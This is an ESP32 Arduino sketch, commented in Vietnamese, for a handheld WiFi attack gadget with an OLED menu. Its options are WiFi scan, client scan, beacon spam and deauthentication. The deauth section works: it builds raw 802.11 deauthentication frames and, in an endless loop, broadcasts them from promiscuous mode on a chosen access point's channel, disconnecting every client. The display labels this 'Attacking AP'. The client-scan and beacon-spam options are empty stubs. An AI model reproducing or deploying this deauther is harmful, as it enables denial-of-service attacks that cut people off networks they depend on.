#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <WiFi.h>
#include "esp_wifi.h"

#define BUTTON_UP 3
#define BUTTON_DOWN 2
#define BUTTON_SELECT 1
#define BUTTON_BACK 6
#define I2C_SDA 4
#define I2C_SCL 5
#define i2c_Address 0x3c

Adafruit_SH1106G display = Adafruit_SH1106G(128, 64, &Wire, -1);

// Cấu hình Menu
const int VISIBLE_LINES = 5;   // Số dòng hiển thị tối đa trên màn hình (64px / 10px mỗi dòng)
const int LINE_HEIGHT = 10;    // Khoảng cách mỗi dòng (size 1)

int selectedItem = 0;          // Mục đang được chọn (0 đến TOTAL_ITEMS-1)
int topItem = 0;               // Mục nằm ở trên cùng của màn hình hiện tại

unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 200;
unsigned long exitdebounceDelay = 500;

// Danh sách biến toàn cục
const int num_menu = 4;
String menu[num_menu] = {"1. Wifi Scan","2. Client Scan","3. Beacon Spam","4. Deauth Clients"};
int num_netw = 0;
enum SCREEN {
  MENU,
  WIFI_SCAN,
  CLIENT_SCAN,
  BEACONSPAM,
  DEAUTHALL
};
SCREEN curr_screen = MENU;
typedef struct WifiCred WifiCred;
String ssid[30];
String client;
typedef void (*SelectCallback)();

// CÁC HÀM DRAW
// Hàm draw
void drawScanning(){
  display.clearDisplay();
  display.setCursor(0,0);
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);

  display.println("Scanning....");
  display.display();
}
// Hàm vẽ và xử lý duyệt danh sách
void drawDisplay(String list[], int totalItems){
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);

  int startY = 12;
  // In header
  switch(curr_screen){
    case SCREEN::MENU:
      display.setCursor(128/2-18,0);
      display.println("MENU");
      display.drawLine(0, 9, 128, 9, SH110X_WHITE);
      break;
    case SCREEN::WIFI_SCAN:
      display.setCursor(0,0);
      display.printf("FOUND %d \n", num_netw);
      display.drawLine(0, 9, 128, 9, SH110X_WHITE);
      break;
    case SCREEN::BEACONSPAM:
      display.setCursor(0,0);
      display.println("AP Spamming:");
      display.drawLine(0, 9, 128, 9, SH110X_WHITE);
      break;
    case SCREEN::DEAUTHALL:
      display.setCursor(0,0);
      display.println("Choose AP:");
      display.drawLine(0, 9, 128, 9, SH110X_WHITE);
      break;
  }
  display.setCursor(0,startY);

  // Duyệt xuống danh sách khi bị giới hạn màn hình
  if (selectedItem >= topItem + VISIBLE_LINES){
    topItem = selectedItem + 1 - VISIBLE_LINES;
  }
  // Quay trở về đầu danh sách khi duyệt hết item cuối
  if (selectedItem < topItem){
    topItem = selectedItem;
  }

  for (int i = 0; i < VISIBLE_LINES; i++){
    int itemIndex = topItem + i;
    if (itemIndex >= totalItems) break;
    display.setCursor(0, (i * LINE_HEIGHT) + startY);
    if (itemIndex == selectedItem){
      display.print("> ");
    } else {
      display.print("  ");
    }
    display.println(list[itemIndex]);
  }

  display.display();
}

// ------------------------------------------
// Hàm xử lý các thao tác button trong duyệt danh sách
void handleNavigation(String list[], int totalItems, SelectCallback onSelect=nullptr){
  int upState = digitalRead(BUTTON_UP);
  int downState = digitalRead(BUTTON_DOWN);
  int selectState = digitalRead(BUTTON_SELECT);
  int backState = digitalRead(BUTTON_BACK);

  if((millis() - lastDebounceTime) > debounceDelay){
    
    // UP - Di chuyển lên
    if (upState == LOW){
      if (totalItems > 0) {
        selectedItem = (selectedItem - 1 + totalItems) % totalItems;
        drawDisplay(list, totalItems);
      }
      lastDebounceTime = millis();
    }

    // DOWN - Di chuyển xuống
    if (downState == LOW){
      if (totalItems > 0) {
        selectedItem = (selectedItem + 1) % totalItems;
        drawDisplay(list, totalItems);
      }
      lastDebounceTime = millis();
    }

    // SELECT - Gọi callback nếu có
    if (selectState == LOW){
      if (onSelect != nullptr) {
        onSelect();  // Gọi hàm callback
      }
      lastDebounceTime = millis();
    }

    // BACK - Quay trở lại menu
    if (backState == LOW && curr_screen!=MENU){
      curr_screen=MENU;
      selectedItem = 0;
      topItem = 0;
      drawDisplay(menu,num_menu);
      lastDebounceTime = millis();
    }
  }


}
// -----------------------------------------
// Hàm xử lý khi chọn 1 nội dung trong menu
void onMenu(){
  switch (selectedItem){
    case 0:
      curr_screen = SCREEN::WIFI_SCAN;
      displayWifi();
      selectedItem = 0;
      topItem = 0;
      break;
    case 1:
      curr_screen = SCREEN::CLIENT_SCAN;
      selectedItem = 0;
      topItem = 0;
      displayClient();
      break;
    case 2:
      curr_screen = SCREEN::BEACONSPAM;
      selectedItem = 0;
      topItem = 0;
      displayDeauth();
      break;
    case 3:
      curr_screen = SCREEN::DEAUTHALL;
      selectedItem = 0;
      topItem = 0;
      displayDeauthAll();
      break;
  }
}

//----------------------------------------------
// WIFI SCAN
void displayWifi(){
  drawScanning();
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0,0);

  num_netw = WiFi.scanNetworks();
  if (num_netw == 0){
    display.println("No Wifi found");
    curr_screen = MENU;
  } else {
    for (int i = 0; i < num_netw; i++){
      ssid[i] = WiFi.SSID(i);
    }
  }
  drawDisplay(ssid,num_netw);
  display.display();
}
// Hàm trả về thông tin wifi
void onWifi(){
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0,0);

  display.println("INFO");
  display.println("--------------");
  display.print("SSID: ");
  display.println(ssid[selectedItem]);
  display.print("RSSI: ");
  display.println(WiFi.RSSI(selectedItem));
  display.print("Channel: ");
  display.println(WiFi.channel(selectedItem));
  display.print("M: ");
  display.println(WiFi.BSSIDstr(selectedItem));
  display.display();
  
  delay(500);
    
  // Đợi nhấn SELECT để quay lại
  while(digitalRead(BUTTON_SELECT) == HIGH){
    delay(10);
  }

  drawDisplay(ssid,num_netw);
}
// ----------------------------------------------

void displayClient(){
  drawScanning();
}

//------------------------------------------------
// DEAUTH

// deauth frame
#define DEAUTH_REQ                                                             \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define BROADCAST (unsigned char *) "\xFF\xFF\xFF\xFF\xFF\xFF"
uint8_t localclient[6] = {0xA8, 0x93, 0x4A, 0x9B, 0x93, 0x21};
// MAC broadcast
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
// hàm thực hiện deauth, cần thông tin mac ap và mac client
void deauth(const uint8_t* bssid, const uint8_t* sta){
  // ref https://github.com/mjlee111/esp32_wifi_deauther/blob/master/esp32_wifi_deauther/wifi_utils.cpp
  struct
  {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  } __attribute__((packed)) deauth_frame;

  deauth_frame.frame_control[0] = 0xC0;  // To DS + From DS + Deauth Frame
  deauth_frame.frame_control[1] = 0x00;
  deauth_frame.duration[0] = 0x3A;
  deauth_frame.duration[1] = 0x01;
  memcpy(deauth_frame. addr1, sta, 6);    // STA address
  memcpy(deauth_frame.addr2, bssid, 6);  // AP address
  memcpy(deauth_frame.addr3, bssid, 6);  // AP address
  deauth_frame. sequence_control[0] = 0x00;
  deauth_frame.sequence_control[1] = 0x00;
  deauth_frame.reason_code[0] = 0x07;  // Reason:  Unspecified reason
  deauth_frame.reason_code[1] = 0x00;

  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
}

void onAPDeauth(){
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0,0);

  uint8_t* targetMAC = WiFi.BSSID(selectedItem);
  //TEST
  // uint8_t* targetMAC = localclient;
  int targetChannel = WiFi.channel(selectedItem);

  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Attacking AP:");
  display.println(ssid[selectedItem]);
  display.printf("At channel: %d",targetChannel);
  display.display();

  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  
  while(1){
    delay(1);
    deauth(targetMAC, BROADCAST);
    // deauth2Way();
    
    display.fillRect(0, 50, 128, 14, SH110X_BLACK);
    display.setCursor(0, 50);
    display.display();
    // Cho phép thoát bằng BACK button
    if(digitalRead(BUTTON_BACK) == LOW){
      break;
    }
  }
  drawDisplay(ssid, num_netw);
}

void displayDeauthAll(){
  displayWifi();
  drawDisplay(ssid,num_netw);
}

//----------------------------------------


void displayDeauth(){
  drawScanning();
}
  

void setup() {
  Serial.begin(115200);
  Wire.setPins(I2C_SDA, I2C_SCL);
  Wire.begin();
  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);
  pinMode(BUTTON_BACK,INPUT_PULLUP);

  if(!display.begin(i2c_Address, true)) for(;;);

  drawDisplay(menu, num_menu);
}

// Xử lý đối với từng màn
void loop() {
  switch(curr_screen){
    case SCREEN::MENU:
      handleNavigation(menu, num_menu, onMenu);
      break;
      
    case SCREEN::WIFI_SCAN:
      handleNavigation(ssid, num_netw, onWifi);
      break;
      
    case SCREEN::CLIENT_SCAN: 
      // handleNavigation(clientList, clientCount, onClientSelect);
      break;
      
    case SCREEN::BEACONSPAM:
      // handleNavigation(deauthList, deauthCount, onDeauthSelect);
      break;
    case SCREEN::DEAUTHALL:
      handleNavigation(ssid, num_netw, onAPDeauth);
      break;
  }
}